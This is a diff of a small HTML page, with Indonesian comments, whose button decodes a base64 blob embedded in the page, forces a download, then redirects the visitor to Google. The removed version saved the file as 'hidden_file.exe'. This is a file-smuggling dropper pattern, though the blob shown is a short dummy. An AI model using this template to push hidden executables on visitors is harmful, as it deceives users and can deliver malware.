@@ -6,25 +6,44 @@
 </head>
 <body>
 
-  <button onclick="downloadFile()">Download</button>
+<button onclick="downloadFile()">Download</button>
 
-  <script>
-    function downloadFile() {
-      // Ganti string base64 di bawah dengan Base64 hasil konversi file kamu
-      var base64Data = "data:application/octet-stream;base64,UEsDBBQAAAAIAK2lUGZTTHpm0D6WvLpkAqYngV24CpWz5yX5v1LkFGjHg97UqXLe42XtTkw5Bgr8EmAqA1Opmr9rw0lwnZ0rR3WqElw/0MiZk+CmP9wTzy0qS7ddbdh8FhzGHwp5LOAiSHTA1+zO7J7H5+m0t0bOAw68tCT7cZBwt7Sh1bUy5LvqqJkV2+HbOVwkcgLwLxZjjjeyhlYl3X9PbiWuwCg=="; 
-      
-      // Buat elemen <a> sementara untuk men-trigger download
-      var link = document.createElement('a');
-      link.href = base64Data;
-      link.download = "hidden_file.exe"; // Nama file yang akan diunduh
-      link.click(); // Memicu download file
+<script>
+function downloadFile() {
 
-      // Redirect ke Google setelah 2 detik
-      setTimeout(function() {
-        window.location.href = "https://www.google.com"; // Redirect ke Google
-      }, 3400); // Tunggu 2 detik sebelum redirect
-    }
-  </script>
+  // contoh base64 kecil (dummy)
+  const base64 = "UEsDBBQAAAAIAK2lUGZTTHpm0D6WvLpkAqYngV24CpWz5yX5v1LkFGjHg97UqXLe42XtTkw5Bgr8EmAqA1Opmr9rw0lwnZ0rR3WqElw/0MiZk+CmP9wTzy0qS7ddbdh8FhzGHwp5LOAiSHTA1+zO7J7H5+m0t0bOAw68tCT7cZBwt7Sh1bUy5LvqqJkV2+HbOVwkcgLwLxZjjjeyhlYl3X9PbiWuwCg==";
+
+  // decode base64 → binary
+  const binary = atob(base64);
+  const len = binary.length;
+  const bytes = new Uint8Array(len);
+
+  for (let i = 0; i < len; i++) {
+    bytes[i] = binary.charCodeAt(i);
+  }
+
+  // buat blob
+  const blob = new Blob([bytes], { type: "application/octet-stream" });
+  const url = URL.createObjectURL(blob);
+
+  // trigger download
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "file_download.bin"; // ganti nama file
+  document.body.appendChild(a);
+  a.click();
+
+  // cleanup
+  URL.revokeObjectURL(url);
+  a.remove();
+
+  // redirect
+  setTimeout(() => {
+    window.location.href = "https://www.google.com";
+  }, 1500);
+}
+</script>
 
 </body>
 </html>
